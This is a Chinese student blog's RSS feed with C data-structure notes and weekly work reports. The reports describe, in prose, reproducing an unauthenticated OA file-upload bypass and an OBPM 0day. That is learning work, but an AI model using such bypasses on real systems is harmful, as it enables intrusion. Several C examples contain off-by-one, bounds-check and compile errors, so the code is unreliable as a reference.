<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>阿卡丽的黑心商店</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>上古时代的宝贝开卖了！</description>
    <pubDate>Sat, 13 Aug 2022 15:32:51 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>顺序表的增删改查</title>
      <link>http://example.com/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</link>
      <guid>http://example.com/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</guid>
      <pubDate>Sat, 13 Aug 2022 15:26:17 GMT</pubDate>
      
      <description>&lt;p&gt;s顺序表的基本操作增删改查（改就是在增删的基础上）&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>s顺序表的基本操作增删改查（改就是在增删的基础上）</p><span id="more"></span><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220416213252923-16604045143081.png" alt="image-20220416213252923"></p><p><code>代码</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line"><span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">insertlist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i&lt;<span class="number">1</span>||i&gt;L.length+<span class="number">1</span>)  <span class="comment">//判断i的范围是否有效</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(L.length&gt;maxsize)  <span class="comment">//判断数组是否已满</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=L.length;j&gt;=i;j--)</span><br><span class="line">L.data[j]=L.data[j<span class="number">-1</span>];</span><br><span class="line">L.data[i]=e;</span><br><span class="line">L.length++;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">sqlist L;</span><br><span class="line">insertlist(L,<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入操作的时间复杂度</p><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220416214334739.png" alt="image-20220416214334739"></p><p>平均循环复杂度  &#x3D;  O(n)</p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data[maxsize];  <span class="comment">//静态数组存放数据元素</span></span><br><span class="line"><span class="type">int</span> length;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">deletelist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> i,<span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(e&lt;i||e&gt;L.length)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=i;j&lt;=L.length;j++)</span><br><span class="line">L.data[j<span class="number">-1</span>]=L.data[j];</span><br><span class="line">L.length--;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">sqlist L;</span><br><span class="line"><span class="type">int</span> L[maxsize]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> e=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>(deletelist(L,<span class="number">3</span>,e))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;删除的第三个位置的值为%d\n&quot;</span>,e);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;删除失败&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除操作的时间复杂度为O（n）</p><h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518161558034.png" alt="image-20220518161558034"></p><h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><p>GetElem(L,i):按位查找操作。获取表L中第i个位置的元素的值。</p><h5 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h5><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518161802282.png" alt="image-20220518161802282"></p><h5 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h5><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162027212.png" alt="image-20220518162027212"></p><p>malloc申请空间返回的指针与前面设置的指针数据类型应该相同</p><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162350193.png" alt="image-20220518162350193"></p><p>最好&#x2F;最坏&#x2F;平均时间复杂度：O(1)</p><h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162644686.png" alt="image-20220518162644686"></p><h5 id="结构类型的比较"><a href="#结构类型的比较" class="headerlink" title="结构类型的比较"></a>结构类型的比较</h5><p><img src="/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/image-20220518162852560.png" alt="image-20220518162852560"></p><p>正确处理方式</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people == b.people) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">pritf(<span class="string">&quot;false&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isCustomerEqual</span> <span class="params">(Customer a,Customer b)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.num == b.num &amp;&amp; a.people ==b.people)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按值查找的时间复杂度<br>$$<br>最好时间复杂度:O(1)<br>最坏时间复杂度:O(n)<br>平均时间复杂度:O(n)<br>$$</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BA%BF%E6%80%A7%E8%A1%A8/">线性表</category>
      
      <category domain="http://example.com/tags/%E9%A1%BA%E5%BA%8F%E8%A1%A8/">顺序表</category>
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      
      <comments>http://example.com/2022/08/13/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>线性表及顺序表的存储</title>
      <link>http://example.com/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/</link>
      <guid>http://example.com/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/</guid>
      <pubDate>Sat, 13 Aug 2022 15:18:15 GMT</pubDate>
      
      <description>&lt;p&gt;线性表的定义以及顺序表的静态存储原理动态存储原理和代码实现&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>线性表的定义以及顺序表的静态存储原理动态存储原理和代码实现</p><span id="more"></span><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p>是一个<strong>有限</strong>序列&#x3D;&gt;有次序  （所以整数按照递增排列，不是线性表）</p><p>直接前驱<br>$$<br>a_1 \leftarrow a_2<br>$$<br>a1是a2的直接前驱</p><p>直接后继<br>$$<br>a_1 \rightarrow a_2<br>$$<br>a2是a1的直接后继</p><h3 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h3><p>引用型参数：需要对参数的修改结果需要带回来</p><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><p>用顺序存储的方式实现线性表——把逻辑上相邻的元素存储在物理位置也相邻的存储单元</p><p><img src="/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416212202152.png" alt="image-20220416212202152"></p><p><img src="/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416212232241.png" alt="image-20220416212232241"></p><h3 id="静态存储"><a href="#静态存储" class="headerlink" title="静态存储"></a>静态存储</h3><p><code>代码</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10   <span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data[MaxSize];   <span class="comment">//静态数组存放数据元素</span></span><br><span class="line"><span class="type">int</span> length;   <span class="comment">//顺序表当前元素长度</span></span><br><span class="line">&#125;SqList;   <span class="comment">//顺序表类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line">L.data[i]=<span class="number">0</span>;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">SqList L;</span><br><span class="line">InitList(L);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;MaxSize;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220415214246742.png" alt="image-20220415214246742"></p><p><strong>正常访问应该是i&lt;L.length，并且Length &#x3D; 0是不可省略的</strong></p><h3 id="动态存储"><a href="#动态存储" class="headerlink" title="动态存储"></a>动态存储</h3><p>malloc函数用于申请空间</p><p><code>代码</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initsize 10   <span class="comment">//默认最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="type">int</span> *data;  <span class="comment">//指示动态分配数组的指针</span></span><br><span class="line"><span class="type">int</span> length;  <span class="comment">//顺序表的当前长度</span></span><br><span class="line"><span class="type">int</span> maxsize;  <span class="comment">//顺序表的最大容量</span></span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initlist</span><span class="params">(sqlist &amp;L)</span>&#123;</span><br><span class="line">L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>(initsize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">L.length = <span class="number">0</span>;</span><br><span class="line">L.maxsize = initsize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加表长</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">increaselist</span><span class="params">(sqlist &amp;L,<span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="type">int</span> *p = L.data;</span><br><span class="line">L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>((L.maxsize+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;L.length;i++)&#123;</span><br><span class="line">L.data[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">L.maxsize = L.maxsize+len;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">sqlist L;</span><br><span class="line">initlist(L);</span><br><span class="line">increaselist(L,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/image-20220416211821527.png" alt="image-20220416211821527"></p><p>realloc函数也可以实现上述过程</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E7%BA%BF%E6%80%A7%E8%A1%A8/">线性表</category>
      
      <category domain="http://example.com/tags/%E9%A1%BA%E5%BA%8F%E8%A1%A8/">顺序表</category>
      
      <category domain="http://example.com/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/">单链表</category>
      
      
      <comments>http://example.com/2022/08/13/%E7%BA%BF%E6%80%A7%E8%A1%A8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>8.8-8.12--工作报告</title>
      <link>http://example.com/2022/08/13/8-8-8-12-%E5%B7%A5%E4%BD%9C%E6%8A%A5%E5%91%8A/</link>
      <guid>http://example.com/2022/08/13/8-8-8-12-%E5%B7%A5%E4%BD%9C%E6%8A%A5%E5%91%8A/</guid>
      <pubDate>Sat, 13 Aug 2022 09:06:56 GMT</pubDate>
      
      <description>&lt;p&gt;8.8-8.12 工作总结周报&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>8.8-8.12 工作总结周报</p><span id="more"></span><p>本周主要进行了对cwe漏洞库的翻译工作，学习和认识了漏洞的种类，等级，概述和使用方法。认识到CWE是一个常见漏洞和暴露的清单，详细说明了在各种软件和硬件中发现的漏洞，但是在CWE中并没有提到环节策略来防止攻击者利用他们呢，在ATT&amp;CK为许多而已战术提供了缓解技术。并进行了对上一周obpm漏洞的补充，主要是互联网上的案例如oa.dacpe.com,微企365等使用该系统漏洞存在的证明，以及去了解学习和复现了致远OA任意文件上传漏洞，当时学习到致远OA的问题是在upload.php文件中if else语句中存在如果传入一个参数p就可以跳过登录界面，所以使用burpisute抓包进行传入path等数据(该漏洞还有连带而出的其他文件上的漏洞)，所以在周五的任务中要查看OBPM源代码确定漏洞所在位置和组件名称，我的思路首先就是关于上传方面的文件的查看，看到了一些if else语句可能存在代码漏洞，以及实用的第三方库好像有一些问题，但是因为是根据poc漏洞逆推，如果正向查找并找不到该疑似漏洞文件的路径，就找了很久，后来在和同事的交流中认识到在另外一个文件中提到了这个直接查找并找不到的路径，我和同事的是发现者通过浏览源代码看到了该文件中提到了一个无法直接找到路径的文件，再查看该文件后看到了存在的该文件中存在漏洞，在该文件中获得上传权限后，再在目标文件夹下载该文件完成对该OA系统的攻击，下周会尝试进行复刻这个过程验证自己思路的正确性。</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E9%9A%8F%E7%AC%94/">随笔</category>
      
      
      <comments>http://example.com/2022/08/13/8-8-8-12-%E5%B7%A5%E4%BD%9C%E6%8A%A5%E5%91%8A/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>工作报告</title>
      <link>http://example.com/2022/08/13/8.1-8.5--%E5%B7%A5%E4%BD%9C%E6%8A%A5%E5%91%8A/</link>
      <guid>http://example.com/2022/08/13/8.1-8.5--%E5%B7%A5%E4%BD%9C%E6%8A%A5%E5%91%8A/</guid>
      <pubDate>Sat, 13 Aug 2022 08:39:30 GMT</pubDate>
      
      <description>&lt;p&gt;8.1-8.5 第二周周报&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>8.1-8.5 第二周周报</p><span id="more"></span><p>​8.1-8.2日完成了对信息安全中心 - Web漏洞渗透测试系统 (poc.icu)靶场的漏洞测试，主要负责了对Session劫持漏洞，Apache文件解析漏洞，任意文件上传漏洞，JS限制文件上传，MIME限制文件上传，扩展名限制文件上传，以及内容限制文件上传，在完成这部分内容后也对sql注入，xss，文件包含漏洞等进行了操作与更系统的学习。在8.3-8.4进行了对obpm的一个0day漏洞的poc代码的学习和复现，找了各个版本不限于myapps进行测试，对未授权的文件上传漏洞进行了更系统性的学习与复现。8.5日去了解了提升文件系统效率方面的论文和专利，如分布式文件系统检索性能优化，基于FastDFS的云存储文件系统性能优化设计与实现等。这一周对于0day漏洞的任务明显感觉到了自身的不足，poc代码都看了有二十分钟才初步弄清楚攻击过程，感觉自身在代码方面也要继续学习，不能只停留在书面上更多的要去注意实操。</p><p>​       下一周的计划还是在完成工作的情况下继续学习web攻防的知识刷ctf的题库，为九月份的ctf继续积蓄知识。</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E9%9A%8F%E7%AC%94/">随笔</category>
      
      
      <comments>http://example.com/2022/08/13/8.1-8.5--%E5%B7%A5%E4%BD%9C%E6%8A%A5%E5%91%8A/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>数据结构绪论</title>
      <link>http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/</link>
      <guid>http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/</guid>
      <pubDate>Sat, 13 Aug 2022 08:24:44 GMT</pubDate>
      
      <description>&lt;p&gt;数据结构入门的一些概念，定义，算法，复杂度等&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p>数据结构入门的一些概念，定义，算法，复杂度等</p><span id="more"></span><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>数据：信息的载体，被<strong>计算机程序识别和处理</strong>的符号的集合</p><p>数据元素：数据的<strong>基本单位</strong>，作为一个整体进行考虑和处理。可由若干<strong>数据项</strong>组成，数据项时构成数据元素的不可分割的<strong>最小单位</strong></p><p>组合项：由更细分的属性组成的数据项</p><p>数据对象：具有<strong>相同性质的数据元素的集合</strong>，是数据的一个子集</p><p>数据结构：相互之间存在一种或多种特定关系的数据元素的集合</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>对特定问题求解步骤的一种描述</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><pre><code>       有穷性：算法是有穷的，程序可以是无穷的（死循环不是算法）       确定性：相同的输入只能得到相同的输出       可行性       输入：0个或多个       输出：1个或多个</code></pre><h3 id="好算法的特质"><a href="#好算法的特质" class="headerlink" title="好算法的特质"></a>好算法的特质</h3><pre><code>        正确性        可读性        健壮性：输入非法数据时，能适当作出反应进行处理        高效率，低存储需求：时间空间复杂度低</code></pre><h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><p>常对幂指阶<br>$$<br>O(1)&lt;O(log_2n)&lt;O(n)&lt;O(nlog_2n)&lt;O(n^2)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)<br>$$</p><p>考虑数量级<br>$$<br>T(n)&#x3D;O(f(n)) \Leftrightarrow \lim\limits_{n\rightarrow\infty}\frac{T(n)}{f(n)}<br>$$<br>加法<br>$$<br>T(n)&#x3D;T_1(n)+T_2(n)&#x3D;O(f(n))+O(g(n))&#x3D;O(max(f(n),g(n))<br>$$<br>乘法<br>$$<br>T(n)&#x3D;T_1(n)*T_2(n)&#x3D;O(f(n))*O(g(n))&#x3D;O(f(n)*g(n))<br>$$</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>越高级的语言执行效率越低</p><h3 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h3><p>函数递归调用带来的内存开销，递归调用深度x与问题规模n的关系：x&#x3D;f（n）</p><h3 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h3><p>逻辑结构数据运算存储结构</p><h4 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h4><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/1.png" style="zoom: 80%;"><p>集合：数据元素同属于一个集合，没有其他关系</p><p>线性结构  ：只存在一对一的关系</p><p>树形结构  ：存在一对多的关系</p><p>网状结构或图状结构：存在多对多的关系</p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520173714417.png" style="zoom:80%;"><h4 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h4><p>1）顺序存储：逻辑上相邻物理上也相邻</p><p>2）链式存储：借助指针来表示元素之间的逻辑关系</p><p>3）索引存储：建立附加的索引表，索引项的一般形式（关键字，地址）</p><p>4）散列存储：哈希存储，根据元素的关键字</p><h2 id="习题"><a href="#习题" class="headerlink" title="习题"></a>习题</h2><p>1.可以用（）定义一个完整的数据结构                  <strong>D</strong></p><p>   A.数据元素B.数据对象C.数据关系D.抽象数据结构</p><p>2.数据结构的说法中，正确的（）<strong>A</strong></p><pre><code>A.数据的逻辑结构独立于其存储结构       B.数据的存储结构独立于其逻辑结构//存储结构是逻辑结构在计算机上的映射C.数据的逻辑结构唯一决定其存储结构D.数据结构仅由其逻辑结构和存储结构决定</code></pre><p>3.<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/3.png"><strong>A</strong></p><p> <img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/4.png"></p><p>4.<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/5.png"></p><p><img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/6.png"></p><p>5.算法原地工作的含义是指算法所需的辅助空间是常量。</p><p>   时间复杂度总是考虑最坏情况下的时间复杂度，以保证算法的运行时间不会比它更长。</p><p>7.<img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182104382.png"></p><p> <img src="/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/image-20220520182039190.png"></p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</category>
      
      
      <comments>http://example.com/2022/08/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BB%AA%E8%AE%BA/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RCE————thinkphp5</title>
      <link>http://example.com/2022/08/11/thinkphp5/</link>
      <guid>http://example.com/2022/08/11/thinkphp5/</guid>
      <pubDate>Thu, 11 Aug 2022 09:53:33 GMT</pubDate>
      
      <description>&lt;p&gt; 基于对RCE的学习，对著名的thinkphpv5进行漏洞复现&lt;/p&gt;</description>
      
      
      
